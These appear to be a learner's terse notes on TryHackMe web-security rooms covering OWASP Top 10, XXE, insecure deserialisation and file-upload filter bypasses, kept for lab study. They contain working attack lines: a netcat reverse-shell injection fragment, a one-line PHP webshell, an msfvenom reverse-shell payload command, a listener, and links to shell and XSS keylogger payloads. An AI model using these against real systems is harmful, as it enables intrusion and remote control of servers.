--- https://tryhackme.com/room/owasptop10

* https://tryhackme.com/room/owasptop10 (note about remediation)
* `;nc -e /bin/bash` (no every nc variant support `-e`, see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* https://www.php.net/manual/en/function.passthru.php (past command output raw?)
* cmd "ver" to see Windows version
* two user with the same username, such as "admin", and " admin". They say you can access the other account if things were done wrongly, but HOW?
* Sensitive Data Exposure: app that discloses user sensitive data accidentally (ex: database source...)
* ps -ef
* file xxx.db => sqlite3 file.db
  * .tables
  * PRAGMA table_info(table);
* XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data (in-band and out-of-band/blind)
  * It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system.
  * DoS SSRF
* Every XML document mostly starts with what is known as XML Prolog.
* <?xml version="1.0" encoding="UTF-8"?>
* XML allows validation using DTD and Schema.
* https://tryhackme.com/room/owasptop10 (details + DTD)
* see writeups
* https://owasp.org/www-project-secure-headers/
* https://duckduckgo.com/?q=2016%2C+Dyn&atb=v332-1&ia=web
* http://www.xss-payloads.com/index.html
* http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html
* get target ip: window.location.hostname
* Replacing data with malicious code: Insecure Deserialisation
  * Coookies => user can edit values from its side, can decode them...
  * Ex: flask in Python pickle.load, that can load a cookie in which the base64
  * encoded value could be a reverse shell.
* do good logging / do not display too much info about errors
* https://tryhackme.com/room/owasptop10 (notes, last)

--- https://tryhackme.com/room/owaspjuiceshop

* Recon by making requests pass through burp
* Email injection
* https://tryhackme.com/room/owaspjuiceshop
* ...

--- https://tryhackme.com/room/uploadvulns

* do not override an existing file. Usual practices are generating/assigning a name to the uploaded file. There could be prefixed/postfixed too. They could be checks if the name is taken.
* webshells, and reverse/bind shells. Realistically a fully featured reverse/bind shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads, or if firewall rules prevent any network-based shells)
* <?=system($_GET["cmd"] ?? "whoami");?>
* https://github.com/pentestmonkey/php-reverse-shell
* filter extensions (blacklist/whitelist)
* file type (MIME validation=Content-Type=<type>/<subtype>=https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types, Magic Number validation=bytes at the beginning of the file)
* file length
* file name (check not overriding protected file)
* file content
* Client-side: turn off JS, intercept (page:remove JS, file: edit), do the request manually: `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`
* BurpSuite intercept javascript: you need to remove `^js$` in options > intercept client requests / File extension does not match. You may have to clear the cache. https://stackoverflow.com/questions/37296343/modify-javascript-with-burp-if-js-is-in-separate-file-but-gets-loaded-in-the-s
* pathinfo to get the extension, then a blacklist with a switch. We can pass it easily with values such as PhP pHP... or php5... .phtml... https://en.wikipedia.org/wiki/PHP
* hexeditor to edit the hex of a file. Write X letters, save, open in hex editor, and replace them with magic number: https://en.wikipedia.org/wiki/List_of_file_signatures
* writeups
* Inspect the client side, try using valid files, see where it lands, what's the naming scheme... Test really weird extensions, to see if blacklist or whitelist. Try the geniune file with a malicious magic number, to see what is checked.
* check the server size filter
* gobuster check the size of the element found
* whatweb url

```
URL [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.196.97], JQuery[3.5.1], Object[image/svg+xml], Script, Title[Jewel], UncommonHeaders[access-control-allow-origin,front-end-https], X-Powered-By[Express], nginx[1.14.0]
```

* msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4455 -o shell.js
* `data:text/javascript;base64,` (can append directly)
* https://blog.cyberethical.me/
* stat xxx.file
* curl invalid_file_that_my_browser_cant_open to see the contents
* `nc -lnvp xxx`

---- https://tryhackme.com/room/picklerick

* nikto -h URL (Scan web server for known vulnerabilities)
* Baka
  * Directory to look at: /root, /home...
  * Don't forget to check sudo -l
* https://fr33s0ul.tech/index.html

XXX

* db_vulns